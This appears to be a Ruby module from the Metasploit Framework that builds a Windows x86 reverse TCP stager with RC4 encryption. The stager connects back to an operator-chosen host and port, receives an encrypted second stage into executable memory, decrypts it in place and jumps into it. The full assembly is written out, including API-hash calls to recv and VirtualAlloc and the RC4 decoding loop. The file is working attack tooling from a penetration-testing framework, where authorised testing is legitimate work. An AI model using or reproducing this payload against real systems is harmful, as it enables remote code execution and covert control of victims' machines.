# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/reverse_tcp'

module Msf

###
#
# Complex reverse_tcp_rc4 payload generation for Windows ARCH_X86
#
###

module Payload::Windows::ReverseTcpRC4

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseTcp

  #
  # Register reverse_tcp_rc4 specific options
  #
  def initialize(*args)
    super
    register_advanced_options([ OptString.new("RC4PASSWORD", [true, "Password to derive RC4 key from"]) ], self.class)
  end

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
      rc4_passwd:  datastore['RC4PASSWORD'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_tcp_rc4(conf)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp_rc4(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_tcp(opts)}
      #{asm_block_recv_rc4(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Fixnum] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_block_recv_rc4(opts={})
    xorkey, rc4key = rc4_keys(opts[:rc4_passwd])
    asm = %Q^
      ; Same as block_recv, only that the length will be XORed and the stage will be RC4 decoded.
      ; Differences to block_recv are indented two more spaces.
      ; Compatible: block_bind_tcp, block_reverse_tcp
      ; Input: EBP must be the address of 'api_call'. EDI must be the socket. ESI is a pointer on stack.
      ; Output: None.
      ; Clobbers: EAX, EBX, ECX, EDX, ESI, (ESP will also be modified)

      recv:
        ; Receive the size of the incoming second stage...
        push byte 0            ; flags
        push byte 4            ; length = sizeof( DWORD );
        push esi               ; the 4 byte buffer on the stack to hold the second stage length
        push edi               ; the saved socket
        push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
        call ebp               ; recv( s, &dwLength, 4, 0 );
        ; Alloc a RWX buffer for the second stage
        mov esi, [esi]         ; dereference the pointer to the second stage length
          xor esi, "#{xorkey}"      ; XOR the stage length
          lea ecx, [esi+0x100]  ; ECX = stage length + S-box length (alloc length)
        push byte 0x40         ; PAGE_EXECUTE_READWRITE
        push 0x1000            ; MEM_COMMIT
          push ecx             ; push the alloc length
        push byte 0            ; NULL as we dont care where the allocation is.
        push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
        call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
          lea ebx, [eax+0x100] ; EBX = new stage address
        push ebx               ; push the address of the new stage so we can return into it
          push esi             ; push stage length
          push eax             ; push the address of the S-box
      read_more:               ;
        push byte 0            ; flags
        push esi               ; length
        push ebx               ; the current address into our second stage's RWX buffer
        push edi               ; the saved socket
        push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
        call ebp               ; recv( s, buffer, length, 0 );
        add ebx, eax           ; buffer += bytes_received
        sub esi, eax           ; length -= bytes_received, will set flags
        jnz read_more          ; continue if we have more to read
          pop ebx              ; address of S-box
          pop ecx              ; stage length
          pop ebp              ; address of stage
          push ebp             ; push back so we can return into it
          push edi             ; save socket
          mov edi, ebx         ; address of S-box
          call after_key       ; Call after_key, this pushes the address of the key onto the stack.
          db "#{rc4key}"
      after_key:
          pop esi                ; ESI = RC4 key
      #{asm_block_rc4}
          pop edi              ; restore socket
        ret                    ; return into the second stage
    ^
  end

  def asm_block_rc4
    asm = %Q^
      ;-----------------------------------------------------------------------------;
      ; Author: Michael Schierl (schierlm[at]gmx[dot]de)
      ; Version: 1.0 (29 December 2012)
      ;-----------------------------------------------------------------------------;
      [BITS 32] 

      ; Input: EBP - Data to decode
      ;        ECX - Data length
      ;        ESI - Key (16 bytes for simplicity)
      ;        EDI - pointer to 0x100 bytes scratch space for S-box
      ; Direction flag has to be cleared
      ; Output: None. Data is decoded in place.
      ; Clobbers: EAX, EBX, ECX, EDX, EBP (stack is not used)

        ; Initialize S-box
        xor eax, eax           ; Start with 0
      init:
        stosb                  ; Store next S-Box byte S[i] = i
        inc al                 ; increase byte to write (EDI is increased automatically)
        jnz init               ; loop until we wrap around
        sub edi, 0x100         ; restore EDI
        ; permute S-box according to key
        xor ebx, ebx           ; Clear EBX (EAX is already cleared)
      permute:
        add bl, [edi+eax]      ; BL += S[AL] + KEY[AL % 16]
        mov edx, eax 
        and dl, 0xF 
        add bl, [esi+edx]
        mov dl, [edi+eax]      ; swap S[AL] and S[BL]
        xchg dl, [edi+ebx]
        mov [edi+eax], dl
        inc al                 ; AL += 1 until we wrap around
        jnz permute
        ; decryption loop
        xor ebx, ebx           ; Clear EBX (EAX is already cleared)
      decrypt:
        inc al                 ; AL += 1
        add bl, [edi+eax]      ; BL += S[AL]
        mov dl, [edi+eax]      ; swap S[AL] and S[BL]
        xchg dl, [edi+ebx]
        mov [edi+eax], dl
        add dl, [edi+ebx]      ; DL = S[AL]+S[BL]
        mov dl, [edi+edx]      ; DL = S[DL]
        xor [ebp], dl          ; [EBP] \^= DL
        inc ebp                ; advance data pointer
        dec ecx                ; reduce counter
        jnz decrypt            ; until finished
     ^
     asm
  end

private

  def rc4_keys(rc4pass = '')
    m = OpenSSL::Digest.new('sha1')
    m.reset
    key = m.digest(rc4pass)
    [key[0,4], key[4,16]]
  end

end

end

